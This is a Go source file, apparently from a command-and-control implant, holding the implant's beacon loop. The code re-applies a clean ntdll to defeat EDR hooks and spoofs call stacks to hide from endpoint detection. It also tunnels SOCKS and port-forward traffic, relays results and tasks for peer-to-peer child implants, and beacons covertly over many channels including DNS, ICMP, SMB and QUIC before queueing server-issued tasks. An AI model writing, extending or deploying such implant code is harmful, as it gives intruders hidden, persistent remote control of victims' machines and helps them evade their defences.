package main

import (
	"encoding/json"
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"
)

// doBeaconSafe wraps doBeacon with panic recovery so an unexpected panic in
// any handler or transport path cannot kill the beacon loop (A-H2).
func doBeaconSafe() {
	defer func() {
		if r := recover(); r != nil {
			if Debug {
				fmt.Printf("[!] beacon panic recovered: %v\n", r)
			}
		}
	}()
	doBeacon()
}

func doBeacon() {
	// Continuously defeat EDRs that re-instrument ntdll between beacons by
	// re-applying the clean .text from disk each cycle (no-op until an operator
	// enables unhooking via the unhook_ntdll task).
	reapplyNtdllUnhook()

	info := getSystemInfo()

	// Collect pending SOCKS relay data
	socksData := socksCollectOutbound()
	if len(socksData) > 0 {
		inFastMode.Store(true) // fast poll while SOCKS is active
	}

	// Collect rportfwd data alongside SOCKS frames
	rpfData := rportfwdCollectOutbound()
	if len(rpfData) > 0 {
		socksData = append(socksData, rpfData...)
		inFastMode.Store(true)
	}

	// Collect lportfwd tunneled data (local listener -> C2 -> target)
	lpfData := lportfwdCollectOutbound()
	if len(lpfData) > 0 {
		socksData = append(socksData, lpfData...)
		inFastMode.Store(true)
	}

	// Collect P2P child results to relay
	p2pRelayMu.Lock()
	relayedResults := make([]RelayedData, 0)
	for _, childUUID := range p2pChildUUIDs {
		results := p2pChildResults[childUUID]
		acks := p2pChildAcks[childUUID]
		if len(results) > 0 || len(acks) > 0 {
			relayedResults = append(relayedResults, RelayedData{
				AgentID:    childUUID,
				Results:    results,
				AckTaskIDs: acks,
			})
			delete(p2pChildResults, childUUID)
			delete(p2pChildAcks, childUUID)
		}
	}
	p2pRelayMu.Unlock()

	// Append gossip peer table to results if enabled (throttled)
	if GossipEnabled && time.Since(lastGossipReport) > 30*time.Second {
		peerTableMu.RLock()
		peers := make([]PeerInfo, 0, len(peerTable))
		for _, p := range peerTable {
			peers = append(peers, p)
		}
		peerTableMu.RUnlock()
		if len(peers) > 0 {
			if data, err := json.Marshal(peers); err == nil {
				enqueueResult(TaskResult{
					Type:   "gossip_discover",
					Output: string(data),
				})
				lastGossipReport = time.Now()
			}
		}
	}

	pendingMu.Lock()
	resultsCopy := pendingResults
	acksCopy := pendingTaskAcks
	pendingResults = nil // sent
	pendingTaskAcks = nil
	pendingMu.Unlock()

	taskCapacity := availableTaskCapacity()
	req := BeaconRequest{
		UUID:            agentUUID,
		ProtocolVersion: CurrentProtocolVersion,
		AgentVersion:    AgentVersion,
		Info:            info,
		Results:         resultsCopy,
		AckTaskIDs:      acksCopy,
		TaskCapacity:    &taskCapacity,
		SocksData:       socksData,
		Relayed:         relayedResults,
		RelayedFrames:   p2pDrainChildFrames(),
	}

	body, _ := json.Marshal(req)

	// Decide frame type and build the v2 envelope. Encryption failures MUST NOT
	// fall back to plaintext (defeats encryption / leaks beacon data); drop the
	// beacon so the data stays queued for the next attempt.
	sendBody, frameKind, frameSeq, ok := buildBeaconEnvelope(body)
	if !ok {
		if Debug {
			fmt.Printf("[!] Beacon encryption failed, dropping beacon (no plaintext fallback)\n")
		}
		pendingMu.Lock()
		pendingResults = append(resultsCopy, pendingResults...)
		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
		reenforcePendingBounds()
		pendingMu.Unlock()
		beaconConsecutiveFailures++
		return
	}

	// Apply traffic shape analysis and adaptation
	sendBody = applyTrafficShaping(sendBody)

	// P2P child mode: beacon through parent instead of server. The whole
	// transport dispatch runs on a (Windows) native thread with a spoofed
	// call stack when useStackSpoofing is active, hiding the implant's Go
	// routines from userland stack-walk based EDR attribution.
	var respBody []byte
	runBeaconSendSpoofed(func() {
		curProto, curBT := getProtocol(), getBeaconTransport()
		switch {
		case P2PParent != "":
			respBody = sendP2PBeacon(sendBody)
		case curProto == "smb" || curBT == "smb":
			respBody = sendSMBBeacon(sendBody)
		case curProto == "tcp":
			respBody = sendTCPBeacon(sendBody)
		case curProto == "dns":
			respBody = sendDNSBeacon(sendBody)
			if respBody == nil {
				dnsConsecutiveFailures++
				if Debug {
					fmt.Printf("[!] DNS beacon failed (%d/%d consecutive failures)\n", dnsConsecutiveFailures, dnsFallbackThreshold)
				}
				if dnsConsecutiveFailures >= dnsFallbackThreshold {
					if Debug {
						fmt.Println("[!] DNS failure threshold reached, falling back to HTTP")
					}
					setProtocol("http")
					respBody = sendWithMode(sendBody)
				}
			} else {
				dnsConsecutiveFailures = 0
			}
		case curProto == "icmp":
			respBody = sendICMPBeacon(sendBody)
		case curProto == "udp":
			respBody = sendUDPBeacon(sendBody)
		case curProto == "quic" || curBT == "quic" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "quic://"):
			respBody = sendQUICBeacon(sendBody)
		case curBT == "wss":
			respBody = sendWSSBeacon(sendBody)
		case curBT == "grpc" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpc://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpcs://"):
			respBody = sendGRPCBeacon(sendBody)
		case curBT == "ssh" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "ssh://"):
			respBody = sendSSHBeacon(sendBody)
		case curBT == "mtls" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "mtls://"):
			respBody = sendMTLSBeacon(sendBody)
		case curBT == "h2c" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "h2c://"):
			respBody = sendH2CBeacon(sendBody)
		default:
			respBody = sendWithMode(sendBody)
		}
	})
	if respBody != nil {
		noteTransportSuccess()
	} else {
		maybeRotateTransport()
	}
	if respBody == nil {
		pendingMu.Lock()
		pendingResults = append(resultsCopy, pendingResults...)
		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
		reenforcePendingBounds()
		pendingMu.Unlock()
		// If the server never saw the frame (transport failure) our persisted
		// sequence may need to move forward. Advance by a small bounded step
		// (never the old +1000, which could itself exceed the replay-jump cap
		// and trip a permanent lockout). A genuine behind-the-server desync is
		// corrected by the server's signed last_seq resync, not by jumping.
		seqMu.Lock()
		beaconSeq += 8
		seqMu.Unlock()
		beaconConsecutiveFailures++
		if Debug {
			fmt.Printf("[!] Beacon returned nil, consecutive failures: %d\n", beaconConsecutiveFailures)
		}
		return
	}

	beaconConsecutiveFailures = 0

	// Parse response. The frame type determines the expected response shape:
	// auth frames get a plaintext envelope, encrypted frames get {"c": ...}.
	var resp BeaconResponse
	switch frameKind {
	case agentFrameRegister, agentFrameHandshake:
		var authResp struct {
			Seq           uint64 `json:"seq"`
			RegOK         bool   `json:"reg_ok"`
			ECDHPub       string `json:"ecdh_pub"`
			Mac           string `json:"mac"`
			Reregister    bool   `json:"reregister"`
			NetworkConfig string `json:"network_config"`
		}
		if err := json.Unmarshal(respBody, &authResp); err != nil {
			if Debug {
				log.Printf("[!] Failed to parse auth response: %v", err)
			}
			// Server rejected the frame (e.g. already registered): fall back to
			// the handshake path which works for any registered agent.
			if frameKind == agentFrameRegister {
				seqMu.Lock()
				registered = true
				seqMu.Unlock()
				persistBeaconState()
				inFastMode.Store(true)
			}
			return
		}
		// Authenticate the server's public key before trusting it.
		if !verifyResponseMAC(authResp.Seq, authResp.ECDHPub, authResp.Mac) {
			if Debug {
				log.Printf("[!] Auth response MAC mismatch, aborting")
			}
			return
		}
		if authResp.Reregister {
			// The server lost our registration (e.g. the implant row was deleted
			// server-side). Re-enroll with a fresh registration frame on the next
			// beacon — we still hold the identity key locally.
			seqMu.Lock()
			registered = false
			seqMu.Unlock()
			persistBeaconState()
			inFastMode.Store(true)
			return
		}
		// Apply any server-delivered network config (encrypted under our
		// per-implant secret). The response MAC already authenticated the frame,
		// so the config is trustworthy.
		applyServerNetworkConfig(authResp.NetworkConfig)
		// On registration the server derived its session from our identity key
		// (the register frame carries IdentityPub); on a handshake it used the
		// ephemeral key we presented. Derive our side with the matching key.
		var sessErr error
		if authResp.RegOK {
			sessErr = ecdhSess.establishRegisteredFromServerKey(authResp.ECDHPub)
		} else {
			sessErr = ecdhSess.establishFromServerKey(authResp.ECDHPub)
		}
		if sessErr != nil {
			if Debug {
				log.Printf("[!] ECDH handshake completion failed: %v", sessErr)
			}
			return
		}
		if authResp.RegOK {
			seqMu.Lock()
			registered = true
			seqMu.Unlock()
			persistBeaconState()
		}
		seqMu.Lock()
		rekeyRequested = false
		seqMu.Unlock()
		// Re-beacon immediately with the encrypted payload.
		inFastMode.Store(true)
		return
	case agentFrameEncrypted:
		var env struct {
			CipherB64 string `json:"c"`
		}
		if err := json.Unmarshal(respBody, &env); err != nil {
			return
		}
		if env.CipherB64 == "" {
			// No ciphertext: server resync (seq behind/ahead after downtime)
			// or a dropped session. Snap to last_seq and handshake next.
			tryResync(respBody)
			if ecdhSess != nil {
				ecdhSess.invalidate()
			}
			inFastMode.Store(true)
			return
		}
		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(frameSeq, 10))
		plaintext, err := ecdhSess.decryptAESGCMWithAAD(env.CipherB64, aad)
		if err != nil {
			// Server restarted or rekeyed: drop the session so the next beacon
			// performs a fresh authenticated handshake.
			if Debug {
				log.Printf("[!] ECDH decrypt failed: %v", err)
			}
			ecdhSess.invalidate()
			inFastMode.Store(true)
			return
		}
		if err := decodeBeacon(plaintext, &resp); err != nil {
			return
		}
		// Fast-forward if the server is ahead of us (guards against a desync
		// where our persisted sequence drifted behind the server's last_seq).
		if resp.LastSeq > 0 {
			seqMu.Lock()
			if resp.LastSeq >= beaconSeq {
				beaconSeq = resp.LastSeq + 1
			}
			seqMu.Unlock()
		}
		if resp.Rekey {
			seqMu.Lock()
			rekeyRequested = true
			seqMu.Unlock()
			ecdhSess.invalidate()
		}
	default:
		return
	}

	// Fleet kill-switch broadcast: verify and obey before processing anything
	// else (tasks, SOCKS, relayed frames).
	if resp.KillSwitch != "" || resp.KillSwitchMAC != "" {
		if verifyKillSwitch(resp.KillSwitch, resp.KillSwitchMAC) {
			engageKillSwitch()
		} else if Debug {
			log.Printf("[!] Ignoring invalid kill-switch broadcast (token mismatch)")
		}
	}

	// Process SOCKS relay frames from server (before tasks, so connect arrives first)
	if len(resp.SocksFrames) > 0 {
		socksProcessFrames(resp.SocksFrames)
	}

	// Distribute relayed tasks to P2P children
	if len(resp.Relayed) > 0 {
		p2pRelayMu.Lock()
		for _, rt := range resp.Relayed {
			p2pChildTasks[rt.AgentID] = append(p2pChildTasks[rt.AgentID], rt.Tasks...)
		}
		p2pRelayMu.Unlock()
	}

	// Relay opaque v2 reply envelopes to children (child sockets pick them up)
	p2pDeliverChildReplies(resp.RelayedReplies)

	// checkFastMode resets inFastMode, so we set SOCKS hints AFTER it
	checkFastMode(resp.Tasks)

	// SOCKS fast mode overrides (after checkFastMode's reset)
	if resp.SocksFastMode || len(resp.SocksFrames) > 0 || socksRelayFast {
		inFastMode.Store(true)
	}
	socksRelayMu.Lock()
	if len(socksRelayConns) > 0 {
		inFastMode.Store(true)
	}
	socksRelayMu.Unlock()

	for _, task := range resp.Tasks {
		enqueueTask(task)
	}
}
